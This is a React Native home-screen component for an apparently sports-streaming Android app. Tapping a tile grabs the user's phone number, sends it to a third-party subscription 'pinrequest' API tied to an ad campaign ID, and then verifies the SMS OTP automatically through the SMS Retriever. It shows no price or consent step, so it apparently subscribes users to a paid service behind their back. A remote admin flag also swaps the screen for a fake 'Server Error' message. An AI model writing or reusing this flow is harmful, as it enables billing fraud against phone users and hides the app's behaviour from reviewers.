import {
  View,
  Text,
  Animated,
  TouchableOpacity,
  StatusBar,
  Image,
  ToastAndroid,
  Modal,
} from 'react-native';
import axios from 'axios';
import { ScaledSheet} from 'react-native-size-matters';
import {useNavigation} from '@react-navigation/native';
import React, {useRef, useEffect, useState} from 'react';
import LinearGradient from 'react-native-linear-gradient';
import {useNetInfo} from '@react-native-community/netinfo';
import * as RNLocalize from 'react-native-localize';
import PhoneInput from 'react-native-phone-number-input';

import Colors from '../theme/color';
import ButtonView from '../components/ButtonView';
import {getPhoneNumberHint} from '../HintRequest';
import {getPhoneNum} from '../helper/datahandler';
import {getOtpRequest, startSmsRetriever} from '../OtpService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import LoadingModal from '../components/LoadingModal';
import {showMessage} from 'react-native-flash-message';

const HomeScreen = () => {
  const netInfo = useNetInfo();
  const phoneInputref = useRef(null);
  const navigation = useNavigation();
  const [statedata, setStateData] = useState({
    requestManualPhone: false,
  });
  const [loading, setLoading] = useState(false);
  const [phoneInput, setPhoneInput] = useState('');
  const [isConnected, setIsConnected] = useState(false);
  const fadeAnim = useRef(new Animated.Value(0)).current;

  useEffect(() => {
    const fetchCountryAndData = async () => {
      try {
        const country = RNLocalize.getCountry();
        console.log(`Detected Country: ${country}`);

        // Test the API separately
        const testResponse = await fetch(
          'https://smsappadmin-default-rtdb.firebaseio.com/data.json',
        );
        console.log('Test API Response:', testResponse);

        if (!testResponse.ok) {
          throw new Error(`API error: ${testResponse.status}`);
        }

        const [response, adminApi] = await Promise.all([
          fetch('https://smsappadmin-default-rtdb.firebaseio.com/data.json'),
          fetch('https://smsappadmin-default-rtdb.firebaseio.com/admin.json'),
        ]);

        const [data, adminData] = await Promise.all([
          response.json(),
          adminApi.json(),
        ]);

        console.log('Fetched Data:', data);
        console.log('Admin Data:', adminData);

        const adminSettings = Object.values(adminData)?.[0];
        if (adminSettings) {
          setIsConnected(adminSettings.enable);
        }

        if (data) {
          const formattedData = Object.keys(data).map(key => ({
            id: key,
            ...data[key],
          }));

          const filteredData = formattedData.find(
            item => item.county?.toLowerCase() === country.toLowerCase(),
          );

          // setApiResponce(filteredData || null);
        }
      } catch (error) {
        console.error('Error in fetchCountryAndData:', error.message);
      } finally {
        setLoading(false);
      }
    };

    fetchCountryAndData();
    startSmsRetriever();
  }, []);

  const data = [
    {
      id: '1',
      title: 'Cricket',
      icon: 'https://cdn-icons-png.flaticon.com/128/1099/1099680.png',
      color: '#FF6B6B',
      url: 'https://www.xoomcric.com/',
    },
    {
      id: '2',
      title: 'Football',
      icon: 'https://cdn-icons-png.flaticon.com/128/2655/2655990.png',
      color: '#FFA500',
      url: 'https://www.xoomsports.com/',
    },
  ];

  const getRealUserIP = async () => {
    try {
      const response = await axios.get('https://api64.ipify.org?format=json');
      return response.data.ip;
    } catch {
      return '192.168.1.1'; // Fallback
    }
  };

  // ✅ Fetch Phone Number and Send Pin Request
  const handleGetPhoneNumber = async item => {
    try {
      const number = await getPhoneNumberHint();
      await sendPinRequest(number, item);
    } catch (error) {
      showMessage({
        message: 'Failed',
        description: 'Failed to retrieve phone number!',
        type: 'warning',
      });
      setTimeout(() => {
        setStateData(prev => ({...prev, requestManualPhone: true}));
      }, 1500);
    }
  };

  // ✅ Send PIN Request
  const sendPinRequest = async (phoneNumber, item) => {
    if (!netInfo.isConnected) {
      showMessage({
        message: 'No Internet',
        description: 'No internet connection!',
        type: 'warning',
      });
      return;
    }

    setLoading(true);
    startSmsRetriever();

    const cleanedNumber = phoneNumber.replace(/\+/g, '');
    const userIP = await getRealUserIP();
    const transactionId = Math.floor(100 + Math.random() * 900);

    const payload = {
      msisdn: cleanedNumber,
      adAgencyCampaignId: '47',
      adAgencyCampaignTransactionId: JSON.stringify(transactionId),
      userIP: 'string',
      ua: 'string',
    };
    console.log('Request Payload:', payload);
    // if (!apiresponce.pinRequestAPI) return;
    try {
      const response = await axios.post(
        'https://universal-subscription-api.vclipss.com/pinrequest',
        payload,
        {
          headers: {
            'Content-Type': 'application/json',
          },
        },
      );

      console.log('API Response:', response.data);

      if (response.errorCode == 0) {
        const otpData = await getOtpRequest();
        if (otpData?.length > 0) {
          await verifyOtp(otpData[0].otp, transactionId, item);
        }
      } else {
        setLoading(false);
        showMessage({
          message: 'ERROR',
          description: response.data.responseMessage,
          type: 'danger',
        });
      }
    } catch (error) {
      setLoading(false);
      console.error('API Error:', error);
      showMessage({
        message: 'ERROR',
        description: 'API request failed!',
        type: 'danger',
      });
    } finally {
      setLoading(false);
    }
  };

  // ✅ Verify OTP
  const verifyOtp = async (otp, transactionId, item) => {
    setLoading(true);

    try {
      const response = await axios.post(
        'https://universal-subscription-api.vclipss.com/pinverify',
        {
          adAgencyCampaignTransactionId: transactionId,
          pin: otp,
        },
      );

      console.log('OTP Verify Response:', response.data);

      if (response.data.status === 'success') {
        await AsyncStorage.setItem('LOGIN', 'true');
        showMessage({
          message: 'ERROR',
          description: 'OTP Verified Successfully!',
          type: 'success',
        });
        navigation.navigate('Browser', {url: item.url, title: item.title});
      } else {
        showMessage({
          message: 'ERROR',
          description:
            response.data.responseMessage || 'OTP Verification Failed!',
          type: 'danger',
        });
      }
    } catch (error) {
      console.error('OTP Verify Error:', error);
      ToastAndroid.show(
        'Failed to verify OTP. Please try again.',
        ToastAndroid.SHORT,
      );
    } finally {
      setLoading(false);
    }
  };

  // ✅ Handle Manual Phone Submit
  const handlePhoneSubmit = () => {
    if (phoneInput) {
      sendPinRequest(phoneInput, data[0]);
      setStateData(prev => ({...prev, requestManualPhone: false}));
      ToastAndroid.show('Phone number saved successfully!', ToastAndroid.SHORT);
    } else {
      ToastAndroid.show(
        'Please enter a valid phone number!',
        ToastAndroid.SHORT,
      );
    }
  };

  return (
    <View style={styles.container}>
      <StatusBar translucent={true} backgroundColor={'transparent'} />

      {/* 🔥 Animated Cards List */}
      {!isConnected ? (
        <View style={{flex: 1, flexDirection: 'row'}}>
          {/* Cricket Section */}
          <LinearGradient
            colors={[Colors.secondary, Colors.secondary_light]}
            style={styles.halfContainer}>
            <TouchableOpacity
              activeOpacity={0.6}
              onPress={() => {
                if (!getPhoneNum()) {
                  handleGetPhoneNumber(data[0]);
                } else {
                  navigation.navigate('Browser', {
                    url: data[0].url,
                    title: data[0].title,
                  });
                }
              }}>
              <Image
                resizeMode="contain"
                source={require('../../src/assets/ball.png')}
                style={styles.icon}
              />
            </TouchableOpacity>
          </LinearGradient>

          {/* Football Section */}
          <LinearGradient
            style={styles.halfContainer}
            colors={[Colors.primary_light, Colors.primary]}>
            <TouchableOpacity
              activeOpacity={0.6}
              onPress={() => {
                if (!getPhoneNum()) {
                  handleGetPhoneNumber(data[1]);
                } else {
                  navigation.navigate('Browser', {
                    url: data[1].url,
                    title: data[1].title,
                  });
                }
              }}>
              <Image
                resizeMode="contain"
                source={require('../../src/assets/football.png')}
                style={styles.icon}
              />
            </TouchableOpacity>
          </LinearGradient>
        </View>
      ) : (
        <LinearGradient
          colors={['#0033A0', '#001F5B', '#192f6a']}
          style={styles.linearGradient}>
          <View style={styles.serverViewStyle}>
            <Image
              tintColor={Colors.white}
              source={{
                uri: 'https://cdn-icons-png.flaticon.com/128/9311/9311566.png',
              }}
              resizeMode="contain"
              style={styles.serverImage}
            />
            <Text style={styles.serverTextStyle}>Server Error</Text>
          </View>
        </LinearGradient>
      )}
      <LoadingModal visible={loading} />

      {/* Modal for Manual Phone Number Input */}
      <Modal
        transparent={true}
        visible={statedata.requestManualPhone}
        animationType="fade"
        onRequestClose={() => {
          setStateData(prev => ({
            ...prev,
            requestManualPhone: true,
          }));
        }}>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Enter Phone Number</Text>

            <PhoneInput
              ref={phoneInputref}
              defaultValue={phoneInput}
              defaultCode="US"
              layout="first"
              onChangeText={setPhoneInput}
              withDarkTheme={false}
              withShadow={false}
              autoFocus={true}
              containerStyle={styles.phoneInputContainer}
              textContainerStyle={styles.phoneInputTextContainer}
              textInputStyle={styles.phoneInputText}
              codeTextStyle={styles.codeText}
              flagButtonStyle={styles.flagButton}
              countryPickerButtonStyle={styles.countryPicker}
            />

            <ButtonView
              variant="primary"
              title="Submit"
              onPress={handlePhoneSubmit}
            />
          </View>
        </View>
      </Modal>
    </View>
  );
};

const styles = ScaledSheet.create({
  container: {
    flex: 1,
  },
  hero: {
    padding: '20@ms',
    borderBottomLeftRadius: '20@ms',
    borderBottomRightRadius: '20@ms',
    marginBottom: '20@ms',
    justifyContent: 'center',
    minHeight: '170@ms',
  },
  heroContent: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    width: '100%',
    paddingHorizontal: '10@ms',
  },
  heroText: {
    fontSize: '24@ms',
    fontWeight: 'bold',
    color: Colors.white,
  },
  subText: {
    fontSize: '13@ms',
    color: Colors.white,
    marginTop: '5@ms',
    textAlign: 'center',
  },
  userImage: {
    width: '70@ms',
    height: '70@ms',
    borderRadius: 100,
    borderWidth: 1,
    borderColor: Colors.accent,
  },
  list: {
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: '15@ms',
    paddingBottom: '20@ms',
  },
  card: {
    margin: '10@ms',
    height: '120@ms',
    borderRadius: '15@ms',
    alignItems: 'center',
    justifyContent: 'center',
    elevation: 7,
    shadowColor: Colors.black,
    shadowOffset: {width: 0, height: 3},
    shadowOpacity: 0.2,
    shadowRadius: 5,
    width: '150@ms',
  },
  cardText: {
    color: Colors.white,
    fontSize: '16@ms',
    fontWeight: 'bold',
    marginTop: '8@ms',
    textAlign: 'center',
  },
  buttonView: {
    justifyContent: 'center',
    alignItems: 'center',
  },
  iconStyle: {
    width: '40@ms',
    height: '40@ms',
  },
  modalOverlay: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: 'rgba(0, 0, 0, 0.5)',
  },
  modalContent: {
    width: '80%',
    padding: '20@ms',
    backgroundColor: Colors.white,
    borderRadius: '10@ms',
    alignItems: 'center',
  },
  modalTitle: {
    fontSize: '18@ms',
    fontWeight: 'bold',
    marginBottom: '15@ms',
    color: Colors.black,
  },
  inputContainer: {
    flexDirection: 'row',
    alignItems: 'center',
    borderWidth: 1,
    borderColor: Colors.gray,
    borderRadius: 8,
    paddingHorizontal: '10@ms',
    paddingVertical: '5@ms',
    backgroundColor: Colors.white,
    marginBottom: '10@ms',
  },
  Phoneicon: {
    marginRight: '5@ms',
    width: '27@ms',
    height: '27@ms',
  },
  modalInput: {
    flex: 1,
    fontSize: '16@ms',
    color: Colors.black,
  },
  loader: {
    marginTop: '-100@ms',
    width: '100@ms',
    height: '100@ms',
  },
  loadingTextStyle: {
    color: Colors.black,
    fontWeight: '500',
    fontSize: '15@ms',
  },
  serverViewStyle: {
    flex: 1,
    justifyContent: 'center',
    alignSelf: 'center',
    marginLeft: '0.5%',
    marginTop: '-100@ms',
  },
  serverTextStyle: {
    color: Colors.white,
    fontWeight: 'bold',
    fontSize: '32@ms',
    textAlign: 'center',
  },
  serverImage: {
    width: '150@ms',
    height: '150@ms',
    alignSelf: 'center',
  },
  halfContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  icon: {
    width: '300@ms',
    height: '700@ms',
    marginBottom: '10@ms',
  },
  linearGradient: {
    flex: 1,
    paddingLeft: '15@ms',
    paddingRight: '15@ms',
    borderRadius: 5,
  },
  phoneInputContainer: {
    width: '100%',
    borderWidth: 1,
    borderColor: Colors.secondary_light,
    borderRadius: 8,
    backgroundColor: Colors.white,
    paddingHorizontal: '10@ms',
    paddingVertical: '5@ms',
    flexDirection: 'row',
    alignItems: 'center',
    marginBottom: '10@ms',
  },
  phoneInputTextContainer: {
    backgroundColor: 'transparent',
    borderRadius: 8,
    paddingVertical: 0,
  },
  phoneInputText: {
    fontSize: '16@ms',
    color: Colors.black,
  },
  codeText: {
    color: Colors.primary,
    fontSize: '16@ms',
    fontWeight: 'bold',
  },
  flagButton: {
    marginRight: '10@ms',
    width: '60@ms',
  },
  countryPicker: {
    borderRightWidth: 1,
    borderColor: Colors.secondary_light,
    paddingRight: '10@ms',
  },
});

export default HomeScreen;
